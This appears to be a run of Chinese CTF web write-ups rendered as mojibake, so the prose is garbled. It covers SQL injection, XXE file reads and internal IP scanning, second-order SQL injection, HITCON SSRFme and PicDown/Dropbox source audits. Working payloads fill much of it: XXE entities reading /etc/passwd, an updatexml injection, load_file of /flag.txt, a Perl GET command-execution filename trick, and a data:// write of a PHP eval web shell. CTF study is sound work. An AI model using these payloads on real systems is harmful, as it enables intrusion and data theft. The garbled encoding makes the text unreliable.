ä¸ºå­—æ®µä¸‹çš„å€¼æœ‰å¾ˆå¤šï¼Œflag ä¸å¥½æ‰¾ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ä¸€ä¸‹ sql é‡Œçš„æ­£åˆ™åŒ¹é… REGEXP æ¥ç›´æ¥åŒ¹é… flag å¼€å¤´çš„å­—ç¬¦ä¸² SQL:REGEXP (runoob.com) 121&quot;||(updatexml(1,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)),1))#&#123;47580ad2-e2fd-4058-9dac-2c7d3eb åªå¾—åˆ°ä¸€åŠï¼Œåˆ©ç”¨ reverse åè½¬å­—ç¬¦ä¸²ã€‚SQLâ€“å­—ç¬¦ä¸²åè½¬å‡½æ•° reverse() ç®€å•æ˜äº†_sql reverse-CSDNåšå®¢ 121&quot;||(updatexml(1,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),1))#&#125;aff4bbe3d7c2-cad9-8504-df2e-2da æœ€ååè½¬å›æ¥å¾—åˆ° ad2-e2fd-4058-9dac-2c7d3ebb4ffa} 1flag&#123;47580ad2-e2fd-4058-9dac-2c7d3ebb4ffa&#125; [NCTF2019]True XML cookbookçœ‹é¢˜ç›®åå°±çŸ¥é“æ˜¯ xxe äº†ï¼Œæ‰“å¼€æ¥æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œç®€å•æŠ“ä¸ªåŒ…ã€‚ å¯ä»¥çœ‹åˆ°è¿”å›åŒ…æœ‰ä¸ª adminï¼Œå¯ä»¥æ¨æµ‹å‡ºå›æ˜¾å¤„åœ¨ username æ ‡ç­¾é‡Œï¼Œå¥—ä¸€ä¸‹xxeæ¨¡æ¿éªŒè¯ä¸€ä¸‹ 1234&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; ä¹Ÿæ˜¯æ‹¿åˆ°äº†æ•æ„Ÿä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰ flag æ–‡ä»¶ï¼Œå°è¯•æ‹¿å–æºç  1234&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;file:///var/www/html/doLogin.php&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿”å› 0ï¼Œå¯èƒ½å› ä¸ºæ˜¯ php æ–‡ä»¶ï¼Œæˆ‘ä»¬ç”¨ä¼ªåè®®æŠŠå®ƒè½¬æˆ base64 . 1234&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=doLogin.php&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; ä¸è¿‡æ²¡ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯ï¼Œçœ‹ wp è¯´æ˜¯ flag å­˜åœ¨äºå†…ç½‘ä¸»æœºä¸Šï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡XXEå¯¹å†…ç½‘è¿›è¡Œæ¢æµ‹ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨ http æˆ–è€… gopher åè®®ï¼Œåæ­£ xxe éƒ½æ”¯æŒã€‚ é‚£ä¹ˆå¦‚ä½•ç¡®å®šä¸»æœº ip å‘¢ï¼Ÿå…ˆæŸ¥çœ‹å‡ ä¸ªé…ç½®æ–‡ä»¶ &#x2F;proc&#x2F;net&#x2F;fib_trieï¼Œ&#x2F;proc&#x2F;net&#x2F;arpï¼Œ&#x2F;etc&#x2F;hostsã€‚è¿™å‡ ä¸ªæ–‡ä»¶éƒ½è·Ÿæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„ç½‘ç»œé…ç½®ä¿¡æ¯æœ‰å…³ 1234&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;file:///proc/net/fib_trie&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; è¿™å‡ ä¸ªæ–‡ä»¶å’Œä¸»æœº ip æœ‰å…³ï¼Œå¾—åˆ°å‡ ä¸ªå†…ç½‘ ip 123169.254.1.110.244.80.3910.128.253.12 ä¸€èˆ¬æ©ç éƒ½æ˜¯ 24 ä½å§ï¼Œæ‰€ä»¥å°±ç”¨ BP çˆ†ç ´æœ€åå…«ä½å§ï¼Œæœ€åå‘ç°é‚£ä¸ªå†…ç½‘ ip æ˜¯ 10.244.80.xxï¼Œè¿˜æœ‰ä¸€ç§è¯´æ³•æ˜¯ BUUCTF è½¬ç”¨äº†K8Sç®¡ç†ï¼Œä»–çš„é¶æœºå®¹å™¨æ˜¯éšæœºåœ¨80ï¼Œ81ä¸¤ä¸ªç½‘æ®µé‡Œçš„ï¼Œæ‰€ä»¥å“ªä¸ª ip ç”¨çš„è¿™ä¸¤ä¸ªç½‘æ®µä¹Ÿè¡Œã€‚ 1234&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;http://10.244.80.Â§39Â§&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; è¿™é‡Œæœ€å¥½å¼€ 100 ä¸ªçº¿ç¨‹çˆ†ç ´ï¼Œæœ€ååœ¨ 10.244.80.140 å‘ç° flag [CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunkæ‰“å¼€é¡µé¢ï¼Œf12 æç¤º ?file= ,åŠ ä¸Šæç¤º flag åœ¨æ ¹ç›®å½•ä¸‹ï¼Œå…ˆè¯•ç€è¯»å– &#x2F;flagï¼Œ&#x2F;flag.txt ï¼Œæ²¡æœ‰ o.O ï¼Ÿä¼ªåè®®è¯»å–ç½‘ç«™çš„å‡ ä¸ª php é¡µé¢çœ‹çœ‹ã€‚ index.php 1234567891011121314&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#x27;file&#x27;]) ? $_GET[&#x27;file&#x27;] : null);if (isset($file))&#123; if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123; echo(&#x27;no way!&#x27;); exit; &#125; @include($file);&#125;?&gt; éš¾æ€ªè¯»ä¸äº†æ ¹ç›®å½•ï¼Œè¢« open_basedir é™åˆ¶ä½äº†ã€‚ç»§ç»­å¾€ä¸‹çœ‹ confirm.php 12345678910111213141516171819202122232425262728293031323334353637&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $address = $_POST[&quot;address&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if($fetch-&gt;num_rows&gt;0) &#123; $msg = $user_name.&quot;å·²æäº¤è®¢å•&quot;; &#125;else&#123; $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;; $re = $db-&gt;prepare($sql); $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone); $re = $re-&gt;execute(); if(!$re) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;è®¢å•æäº¤æˆåŠŸ&quot;; &#125;&#125; else &#123; $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;&#125;?&gt; å¯ä»¥çœ‹åˆ°æœ‰é¢„å¤„ç†ï¼Œæ‰€ä»¥è¿™ä¸ªé¡µé¢ sql æ³¨å…¥çš„å¯èƒ½æ€§åº”è¯¥ä¸å¤§ã€‚ change.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;]; $result = $db-&gt;query($sql); if(!$result) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;; &#125; else &#123; $msg = &quot;æœªæ‰¾åˆ°è®¢å•!&quot;; &#125;&#125;else &#123; $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;&#125;?&gt; è¿™é‡Œè™½ç„¶å¯¹ user_name ,phone åšäº†æ ¡éªŒï¼Œä½†æ˜¯ address ç›´æ¥å°±å¤„ç†äº†ï¼Œå¯ä»¥ä»è¿™é‡Œæ³¨å…¥ï¼Œè€Œä¸”æŸ¥è¯¢é¡µé¢ä¹Ÿæ²¡æœ‰å¯¹æ›´æ–°çš„åœ°å€å¤„ç†ï¼Œæ‰€ä»¥ç›¸å½“äºè¿™é‡Œæœ‰ä¸€ä¸ªäºŒæ¬¡æ³¨å…¥ç‚¹ã€‚ 1address=&#x27;,`address`=database()%23&amp;phone=1&amp;user_name=1 æ‰€ä»¥ç›´æ¥è¯•è¯•è¯»å–æ–‡ä»¶ 1address=&#x27;,`address`=load_file(&quot;/flag.txt&quot;)%23&amp;phone=1&amp;user_name=1 å¾—åˆ° flagã€‚ [HITCON 2017]SSRFmeä¸€é“ php ä»£ç å®¡è®¡ 12345678910111213141516171819106.224.184.126 &lt;?php if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]); $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0]; &#125; echo $_SERVER[&quot;REMOTE_ADDR&quot;]; $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); $info = pathinfo($_GET[&quot;filename&quot;]); $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); å…³é”®åœ¨ GET å‘½ä»¤ä¸Š linuxgetå‘½ä»¤è¯¦è§£ â€¢ Worktileç¤¾åŒºï¼Œå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶å¤¹åˆ™ç­‰å¾—åˆ°å…¶ä¸‹çš„æ‰€æœ‰ç›®å½•ä»¥åŠæ–‡ä»¶åï¼Œå¦‚æœæ˜¯æ–‡ä»¶å°±èƒ½ç›´æ¥ä¸‹è½½ã€‚ å› ä¸º $http_x_headers å¯æ§ï¼Œæ‰€ä»¥åˆ›å»ºçš„æ–‡ä»¶å¤¹ä»¥åŠæ–‡ä»¶åæˆ‘ä»¬éƒ½å¯ä»¥æ§åˆ¶ï¼Œä»¤ X-FORWARDED-FOR å­—æ®µä¸º 1ï¼Œç›®å½•è®¡ç®—ä¸€ä¸‹å°±æ˜¯ sandbox&#x2F;b3e24b7672fddf21613da79b21ff7c99 ã€‚ ç›´æ¥è¯•ä¸€ä¸‹çœ‹æ ¹ç›®å½• 1?url=/&amp;filename=b ç„¶åè®¿é—® sandbox&#x2F;b3e24b7672fddf21613da79b21ff7c99&#x2F;b è¯•ç€ä¸‹è½½ &#x2F;flag æ–‡ä»¶ï¼Œå¤±è´¥ã€‚å‘ç°è¿˜æœ‰ &#x2F;readflag æ–‡ä»¶ï¼Œåº”è¯¥æ˜¯æƒé™ä¸å¤Ÿï¼Œæˆ‘ä»¬åªè¦æ‰§è¡Œ &#x2F;readflag å°±èƒ½æ‹¿åˆ° flag äº†ã€‚ æ³•ä¸€ï¼šperlè„šæœ¬GETç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ[perlè„šæœ¬ä¸­GETå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆHITCON 2017]SSRFmeï¼‰_perlæ¼æ´-CSDNåšå®¢ 123touch &#x27;id|&#x27;GET â€™file:id|&#x27;uid=0(root) gid=0(root) groups=0(root) perlè„šæœ¬ä¸­GETå‘½ä»¤åŸºäº open å‡½æ•°ï¼Œopen å‡½æ•°æ”¯æŒ file åè®®æ‰€ä»¥å¯ä»¥æŠŠæ–‡ä»¶åå½“å‘½ä»¤æ¥æ‰§è¡Œï¼ˆå‰æè¯¥æ–‡ä»¶å­˜åœ¨ï¼‰ï¼Œæˆ‘ä»¬æƒ³æ‰§è¡Œ &#x2F;readflagï¼Œç›¸å½“äº bash -c /readflag,é‚£å°±è¦å…ˆåˆ›å»ºä¸€ä¸ª bash -c &#x2F;readflag| æ–‡ä»¶ã€‚ æˆ‘ä»¬çŸ¥é“åˆ›å»ºæ–‡ä»¶åå¯æ§ï¼Œæ‰€ä»¥ 1?url=&amp;filename=bash -c /readflag| ç„¶åæ‰§è¡Œ 1?url=file:bash -c /readflag|&amp;filename=b è®¿é—® b æ–‡ä»¶å³å¯ã€‚ æ³•äºŒï¼šdata ä¼ªåè®®ã€HITCON 2017ã€‘SSRFmeâ€”â€”æœ€ç®€å•ä¼ªåè®®æ€è·¯ - CAP_T - åšå®¢å›­ (cnblogs.com) è¿™é‡Œä¹Ÿéš¾ç”¨ data åè®®å†™ğŸï¼Œæˆ‘çŒœæµ‹ open å‡½æ•°ä¹Ÿæ”¯æŒ data åè®®ï¼ˆå¥½ç¥å¥‡ï¼‰ï¼Œå‘½ä»¤è¡Œä¼šæŠŠ &lt;? ä½œä¸ºä¿ç•™å­—å¤„ç†ï¼Œæ‰€ä»¥ç”¨å¼•å·åŒ…è£¹èµ·æ¥ 1?url=data://text/plain,&#x27;&lt;?eval($_POST[1])?&gt;&#x27;&amp;filename=shell.php è®¿é—® shell.php sandbox/b3e24b7672fddf21613da79b21ff7c99/shell.php 11=system(&quot;bash -c /readflag&quot;); å³å¯å¾—åˆ° flag [ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDownç»™äº†ä¸ªæ¥å£å¯ä»¥æ–‡ä»¶ä¸‹è½½ï¼Œæˆ‘å‚»äº†ä¸€ä¸Šæ¥å°±ä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œåæ¥æ‰å‘ç°è¿™ä¸æ˜¯ phpï¼Œå…ˆè¯•ç€è¯»å– &#x2F;etc&#x2F;passwd,æˆåŠŸäº†ï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½ã€‚ç„¶åæŸ¥çœ‹é…ç½®æ–‡ä»¶ /proc/self/cmdline cmdline æ–‡ä»¶å­˜å‚¨ç€å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼Œä½†åƒµå°¸è¿›ç¨‹ç›®å½•ä¸­çš„æ­¤æ–‡ä»¶ä¸åŒ…å«ä»»ä½•ä¿¡æ¯ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹cmdlineç›®å½•è·å–å¯åŠ¨æŒ‡å®šè¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼š ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œèƒ½çœ‹åˆ°ä¸€äº›å¯åŠ¨åº”ç”¨è¿›ç¨‹çš„å‘½ä»¤ï¼Œä¸‹è½½æ‰“å¼€ 1python2 app.py è¯´æ˜è¿™ä¸ªæ˜¯ python çš„åº”ç”¨ æ³•ä¸€ï¼šå…ˆä¸‹è½½æºç  app.py çœ‹çœ‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;search.html&#x27;)@app.route(&#x27;/page&#x27;)def page(): url = request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype=&#x27;application/octet-stream&#x27;) response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27; return response else: value = &quot;HACK ERROR!&quot; except: value = &quot;SOMETHING WRONG!&quot; return render_template(&#x27;search.html&#x27;, res=value)@app.route(&#x27;/no_one_know_the_manager&#x27;)def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return resif __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8080) å¯ä»¥çœ‹åˆ° &#x2F;no_one_know_the_manager è·¯ç”±ä¸‹å¯ä»¥ä»»æ„ä»£ç æ‰§è¡Œï¼Œå‰ææ˜¯çŸ¥é“ SECRET_KEY ï¼Œè€Œ SECRET_KEY æ¥è‡ªäº &#x2F;tmp&#x2F;secret.txtï¼Œè¿™ä¸ªæ–‡ä»¶å·²ç»è¢«åˆ é™¤äº†ï¼Œä¸è¿‡è¿™ä¸ªæ–‡ä»¶æ‰“å¼€äº†å°±æ²¡å…³é—­ï¼Œè¿˜æ˜¯ä¼šå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œä¼šåˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ï¼Œæˆ‘ä»¬è¯»å–æ–‡ä»¶æè¿°ç¬¦é‡Œçš„å†…å®¹å°±è¡Œï¼Œproc&#x2F;self&#x2F;fd&#x2F;xx fdæ˜¯ä¸€ä¸ªç›®å½•ï¼Œé‡Œé¢åŒ…å«ç€å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æè¿°ç¬¦ï¼ˆfile descriptorï¼‰å·®ä¸å¤šå°±æ˜¯è·¯å¾„å•¦ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·è¿æ¥ï¼Œå³æ¯ä¸ªé€šè¿‡è¿™ä¸ªè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶éƒ½ä¼šæ˜¾ç¤ºåœ¨è¿™é‡Œã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡fdç›®å½•çš„æ–‡ä»¶è·å–è¿›ç¨‹ï¼Œä»è€Œæ‰“å¼€æ¯ä¸ªæ–‡ä»¶çš„è·¯å¾„ä»¥åŠæ–‡ä»¶å†…å®¹ 0,1,2 æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œé‚£è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦å°±æ˜¯ 3 äº†ã€‚è¯»å– &#x2F;proc&#x2F;self&#x2F;fd&#x2F;3,å°±èƒ½å¾—åˆ° SECRET_KEYï¼Œå¾—åˆ°äº†ç„¶åæ‰§è¡Œ shell æ— å›æ˜¾ç›´æ¥å¤–å¸¦å°±è¡Œäº† æ³•äºŒï¼šéé¢„æœŸè¯»å– &#x2F;flag [CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropboxæ‰“å¼€ç½‘ç«™ï¼Œå…ˆæ³¨å†Œå†ç™»å½•ï¼Œæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œä¸”åªè®©ä¸Šä¼  jpgï¼Œpngï¼Œgifã€‚è¿™ä¸ªæ”¹ä¸€ä¸‹ Content-Type: image/jpg å°±å¯ä»¥ç»•è¿‡ã€‚ä¸Šä¼ æˆåŠŸåæœ‰ä¸ªä¸‹è½½çš„ api ï¼Œå¯ä»¥å®ç°æ–‡ä»¶è¯»å–ã€‚ 1filename=/etc/passwd æˆåŠŸè¯»å–é…ç½®æ–‡ä»¶ï¼Œæƒ³è¯» &#x2F;flag,&#x2F;flag.txt çš„æ—¶å€™å¤±è´¥äº†ï¼Œè¯»ä¸€ä¸‹æºç ã€‚ index.php 1234567&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION[&#x27;sandbox&#x27;]);$a-&gt;Name();$a-&gt;Size();?&gt; class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function user_exist($username) &#123; $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;; $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;; foreach ($this-&gt;funcs as $func) &#123; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;; &#125; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;; $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;; foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table .= &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;; &#125; $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;; $table .= &#x27;&lt;/tr&gt;&#x27;; &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size = filesize($this-&gt;filename); $units = array(&#x27; B&#x27;, &#x27; KB&#x27;, &#x27; MB&#x27;, &#x27; GB&#x27;, &#x27; TB&#x27;); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;?&gt; upload.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;include &quot;class.php&quot;;if (isset($_FILES[&quot;file&quot;])) &#123; $filename = $_FILES[&quot;file&quot;][&quot;name&quot;]; $pos = strrpos($filename, &quot;.&quot;); if ($pos !== false) &#123; $filename = substr($filename, 0, $pos); &#125; $fileext = &quot;.gif&quot;; switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) &#123; case &#x27;image/gif&#x27;: $fileext = &quot;.gif&quot;; break; case &#x27;image/jpeg&#x27;: $fileext = &quot;.jpg&quot;; break; case &#x27;image/png&#x27;: $fileext = &quot;.png&quot;; break; default: $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Only gif/jpg/png allowed&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); die(); &#125; if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !== 0) &#123; $dst = $_SESSION[&#x27;sandbox&#x27;] . $filename . $fileext; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); &#125; else &#123; $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Invaild filename&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); &#125;&#125;?&gt; download.php 123456789101112131415161718192021222324&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;if (!isset($_POST[&#x27;filename&#x27;])) &#123; die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);chdir($_SESSION[&#x27;sandbox&#x27;]);$file = new File();$filename = (string) $_POST[&#x27;filename&#x27;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123; Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename)); echo $file-&gt;close();&#125; else &#123; echo &quot;File not exist&quot;;&#125;?&gt; delete.php 12345678910111213141516171819202122232425262728&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;if (!isset($_POST[&#x27;filename&#x27;])) &#123; die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#x27;sandbox&#x27;]);$file = new File();$filename = (string) $_POST[&#x27;filename&#x27;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); echo json_encode($response);&#125; else &#123; Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;); echo json_encode($response);&#125;?&gt; å¯ä»¥å‘ç° 